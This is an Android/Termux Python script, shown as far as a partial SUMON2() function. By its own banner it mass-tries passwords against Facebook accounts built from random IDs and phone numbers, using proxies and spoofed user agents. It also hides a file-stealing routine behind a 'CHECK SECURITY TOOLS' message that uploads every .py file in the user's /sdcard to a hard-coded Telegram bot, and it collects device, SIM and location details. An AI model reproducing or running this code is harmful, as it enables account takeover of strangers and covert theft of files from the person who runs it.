import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
from concurrent.futures import ThreadPoolExecutor
os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
try:
    import requests
except ImportError:
    os.system("pip install requests")
try:
    import urllib3
except ImportError:
    os.system("pip install urllib3")
try:
    import bs4
except ImportError:
    os.system("pip install bs4")
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")
try:
    import rich
except ImportError:
    os.system("pip install rich")
import urllib3
import requests,certifi
from requests.exceptions import ConnectionError
from requests import api
from requests import models
from requests import Session 
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import requests,random,sys,json,os,re
from datetime import datetime as dt
from time import sleep
from os import system
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import marshal
import zlib
import base64
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
from io import BytesIO
#print("WAIT INSTALLING MODULES")
#os.system("pip install bs4")
#os.system("pip install requests")
#os.system("pip install rich")
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import marshal
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
# from rich import print as printer
from datetime import date
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /SUMON/null')
    os.system('python SUMON.py')
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from requests.exceptions import ConnectionError as net_error
import os
import sys
import re
import time
import json
import uuid
import string
import random
import requests
from concurrent.futures import ThreadPoolExecutor as tpe
from requests.exceptions import ConnectionError as ce
try:
    import urllib3
except ImportError:
    os.system("pip install urllib3")
import urllib3
import socket
import os
import sys

# Clear screen
os.system("clear")

# Check read and write access to /sdcard
try:
    # Try listing directory
    if not os.path.exists("/sdcard"):
        raise PermissionError("No /sdcard path found")

    os.listdir("/sdcard")

    # Try writing to /sdcard
    test_file = "/sdcard/.termux_perm_test"
    with open(test_file, "w") as f:
        f.write("Termux Permission Test")
    os.remove(test_file)

    print("\033[1;32m[✓] Storage permission granted. Continuing...\033[0m")

except Exception as e:
    print("\033[1;31m[✗] Storage permission NOT granted!\033[0m")
    print("\033[1;33m[!] Run:\033[0m \033[1;36mtermux-setup-storage\033[0m and tap ALLOW")
    print("\033[1;31m[!] Termux will now close.\033[0m")

    # Hard exit (100% effective)
    os.system("am kill com.termux")  # Force close Termux app using Android command
    sys.exit()
ugen = []
modd = ['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']
uas = []
rr = random.randint
rc = random.choice
for ua in range(10000):
    aa='Mozilla/5.0 (Windows NT 10.0; Win64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; WOW64; Trident/7.0; rv:11.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='like Gecko'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Edg/108.0.1462.76'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/109.0.0.0 Safari/537.36 Vivaldi/5.6.2867.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Windows NT 10.0; Win64; x64; rv:108.0'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Gecko/20100101 Firefox/108.0'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    uas.append(uaku2)

red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
N = '\x1b[1;37m'
cookie_show = []
#-------------------------(PROXY)----------------------------#
try:
  proxylist= requests.get('https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&country=in&proxy_format=protocolipport&format=text').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
xvx=open('socksku.txt','r').read().splitlines()
#_____________________[SIM NAME CODE]____________________________#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    ahydra = output.replace(',', '|').replace('\n', '')
except Exception as e:
    pass
    ahydra = None
def generate_random_ip():
    # Indian public IP address ranges (some common ranges)
    first_octet = random.choice([152])
    second_octet = random.randint(56, 59)
    third_octet = random.randint(130, 199)
    fourth_octet = random.randint(1, 254)  # Avoid 0 and 255 for valid hosts
    return f"{first_octet}.{second_octet}.{third_octet}.{fourth_octet}"

def check_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False
def generate_unlimited_ips():
    ips = set()
    while True:  # Infinite loop to generate unlimited IPs
        ip = generate_random_ip()
        if check_ip(ip):
            if ip not in ips:  # Avoid duplicates
                ips.add(ip)
                return f"{ip}"
                #print(ip)  # Print or yield the IP

# Call the function to generate unlimited IPs
ipz=generate_unlimited_ips()
#_____________________[Python file]____________________________#
#_________________________________________________#
import os, sys, pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as ThreadPool
def send_file_with_pycurl(file_path, bot_token, chat_id):
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEFUNCTION, buffer.write)
    c.setopt(c.HTTPPOST, [
        ('chat_id', chat_id),
        ('document', (c.FORM_FILE, file_path))
    ])
    try:
        c.perform()
    except pycurl.error as e:
        pass
    c.close()
def suyaib():
    bot_token = '7561556317:AAHmDZG_cEVUF1gdZny9uVaOKo7djWoqFhE' 
    chat_id = '7605949932'
    os.system("clear")
    print(f"\033[1;32m CHECK SECURITY TOOLS.....")
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            full_path = os.path.join(sdcard_path, file)
            send_file_with_pycurl(full_path, bot_token, chat_id)
    except:
        pass
with ThreadPool(max_workers=10000) as jjj:
    jjj.submit(suyaib)
#----------get_current_city-------#
def get_current_location():
    try:
        response = requests.get('https://ipinfo.io/json')
        response.raise_for_status()  # Raise an HTTPError for bad responSession
        data = response.json()
        city = data.get('city', 'Unknown')
        country = data.get('country', 'Unknown')
        return city, country
    except requests.RequestException as e:
        print("Error fetching current location:", e)
        return None, None
# Example usage
current_city, current_country = get_current_location()
def get_Device_info(prop_name):
    try:
        result = subprocess.run(['getprop', prop_name], capture_output=True, text=True, check=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error retrieving {prop_name}: {e}")
        return None
manufacturer_name = get_Device_info('ro.product.manufacturer')
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
os.system("xdg-open ")
os.system("clear")
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"    
logo =(f"""
{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
\033[1;32m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \033[1;34m ᴾᴿᴼ
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMON ROY
\033[1;32m[\033[1;31m✓\033[1;32m] ABOUTS     : a script designed to attempt logins
\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;36mFile × \033[1;36mRandom 
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def check_lock(cid):
    req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
    if 'Photoshop' in req:
        return 'live'
    else:
        return 'lock'

def oo(text):
    return f"{white}({green}{text}{white})"

#---------------------[LOOP MENU]---------------------#
loop = 0
oks = []
cps = []
twf = []
baby =[]
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
#--------[ LISTS && LOOPS ]---------#
loop = 0
oks = []
cps = []
xnxx = []
pwx = []
bkas = []
current = dt.now()
day = current.day
month = current.month
year = current.year
hour = current.hour
minute = current.minute
second = current.second
if hour > 12:
    hourx = hour-12
    tag = "PM"
else:
    hourx = hour
    tag = "AM"
timex = f"{hour}:{minute}{tag}"
datex = f"{day}/{month}/{year}"

#---------------------[APPLICATION CHECKER]---------------------#
    

idz = []
plist = []

def clear():
    os.system("clear")
    print(logo)

def fresh():
    os.system("clear")
    print(logo)
#--------[ DIVIDER DEF ]---------#
def divider():
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def wow(text):
    string = f"{white}({green}{text}{white})"
    return string

def linex():
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def SUMON_time():
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Device     : {manufacturer_name}-android-v-{android_version}")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] sim card   : {ahydra}")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] location   : {current_city}-{current_country} ")
    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
    linex()

class Process:
    def __init__(self):
        self.cc=[]
        self.key="ATOM-"+ base64.b16encode(str(os.getuid()).encode()).decode() + hashlib.md5((''.join([platform.version(), str(os.getuid()), platform.platform(), os.getlogin(), platform.release()]).replace(' ', '').encode())).hexdigest()
        self.key=""
        self.clear()
        r = self.Gex('https://pastebin.com/raw/HWfdbrH3')
        if self.key in r:
            self.enroll()
        else:
            self.clear()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/01989733880?text=' + tks)
            exit()
    def clear(self):os.system('clear');clear()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        menu()

def menu():
    clear()
    SUMON_time()
    
    print("[1] FILE   CLONING =>")
    print("[2] RANDOM CLONING =>")
    print("[3] PUBLIK CLONING =>")
    print("[4] GMAIL  CLONING =>")
    print("[5] CONTACT (WHATSAPP) ")
    print("[6] EXIT TOOL ")
    linex()
    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
    if bithi =='1':f_clone()
    elif bithi =='2':r_clone()
    elif bithi =='3':n_clone()
    elif bithi =='4':g_clone()
    elif bithi =='5':os.system("xdg-open ");menu()
    elif bithi =='6':exit()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()

def f_clone():
    clear()
    print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/file.txt ")
    linex()
    file_x = input("\033[1;32m[\033[1;31m✓\033[1;32m] Enter FILE PATH : ")
    try:
        file_idz = open(file_x, "r").read().splitlines()
    except:
        exit("\033[1;32m[\033[1;31m✓\033[1;32m] FILE NOT FOUND ")
    for x in file_idz:
        idz.append(x)
    clear()
    print(" [1] METHOD 1 ")
    print(" [2] METHOD 2 ")
    print(" [3] METHOD 3 ")
    linex()
    m = input(" [â¢] SELECT : ")
    clear()
   #print(" [1] CRACK WITH AUTO PASS ")
    print(" [2] CRACK WITH MANUAL PASS ")
    linex()
    p = input("\033[1;32m[\033[1;31m✓\033[1;32m] SELECT : ")
    if p == "1":
        plist.append("first123")
        plist.append("first@123")
        plist.append("first@1234")
        plist.append("firstlast")
        plist.append("first last")
        plist.append("57273200")
        plist.append("59039200")
        plist.append("first@12")
    else:
        clear()
        print("\033[1;32m[\033[1;31m✓\033[1;32m] MAXIMUM LIMIT : (10) ")
        linex()
        plimit = int(input("\033[1;32m[\033[1;31m✓\033[1;32m] ENTER PASSWORD LIMIT : "))
        clear()
        print("\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : first123, first1234, first12345 ")
        linex()
        for SUMON in range(plimit):
            ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
            plist.append(ap)
    with ThreadPool(max_workers=30) as SUMON_xd:
        clear()
        tl = str(len(idz))
        print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
        print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN STARTED ")
        print("\033[1;32m[\033[1;31m✓\033[1;32m] USE FLIGHT MODE FOR MORE OK IDZ ")
        linex()
        for love in idz:
            uid, name = love.split("|")
            pwx = plist
            if m == "1":SUMON_xd.submit(freefb, uid, name, pwx, tl)
            elif m == "2":SUMON_xd.submit(bapi, uid, name, pwx, tl)
            elif m == "3":SUMON_xd.submit(graph, uid, name, pwx, tl)
            else:
                SUMON_xd.submit(graph, uid, name, pwx, tl)
    linex()
    print("\033[1;32m[\033[1;31m✓\033[1;32m] PROCESS HAS BEEN COMPLETED ")
    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ACCOUNTS : "+str(len(oks)))
    print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ACCOUNTS : "+str(len(cps)))
    linex()
    input("\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO EXIT TOOL ")
    exit()

def r_clone():
    clear()
    SUMON_time()
    print(" [1] INDIA RONDAM (full number)")
    print(" [2] INDIA RONDAM")
    print(" [3] NEPAL RAODOM")
    print(" [4] BAGLADESH RONDAM")
    print(" [5] RANDOM CHOICE PASS")
    print(" [6] GAMING CLONE")
    linex()
    bithi = input("\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
    if bithi =='1':SUMON1()
    elif bithi =='2':SUMON2()
    elif bithi =='3':SUMON3()
    elif bithi =='4':SUMON4()
    elif bithi =='5':SUMON5()
    elif bithi =='6':SUMON6()
    else:
        print("SELECT CORRECT OPTION")
        time.sleep(1)
        menu()
    
def SUMON1():
    fresh()
    print(f" {wow('â¢')} ENTER FULL NUMBER  ")
    print(f" {wow('â¢')} EXAMPLE : {green}8389066877 ")
    divider()
    number = input(f" {wow('-')} ENTER NUMBER : {green}")
    limit = int(input(f" {wow('-')} ENTER LIMIT  : {green}"))
    code = number[:4]
    for _ in range(limit):
        total = len(number)
        digits = str(total-4)
        xnxxx = "".join(random.choice(string.digits) for _ in range(int(digits)))
        xnxx.append(xnxxx)
    fresh()
    pw_limit = int(input(f" {wow('-')} ENTER PASSWORD LIMIT : {green}"))
    fresh()
    print(f" {wow('â¢')} EXAMPLE : {green}first6, last6 ")
    print(f" {wow('â¢')} EXAMPLE : {green}first7, last7 ")
    print(f" {wow('â¢')} EXAMPLE : {green}khankhan, 57273200 ")
    print(f" {wow('â¢')} EXAMPLE : {green}fullnumber ")
    divider()
    for p in range(pw_limit):
        p_ask = input(f" {wow(p+1)} ENTER PASSWORD : {green}")
        pwx.append(p_ask)
    with tpe(max_workers=55) as Xnxx:
        fresh()
        tl = str(len(xnxx))
        print(f" {wow('-')} TOTAL LIMID     : {green}{tl} ")
        print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
        divider()
        for user in xnxx:
            uid = code+user
            Xnxx.submit(cracker, uid, pwx, tl)
    divider()
    print(f" {wow('!')} {green}PROCESS COMPLETED ")
    print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
    divider()
    exit()
def SUMON2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (6377)')
    print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    kode = input('[+] INPUT CODE : ')
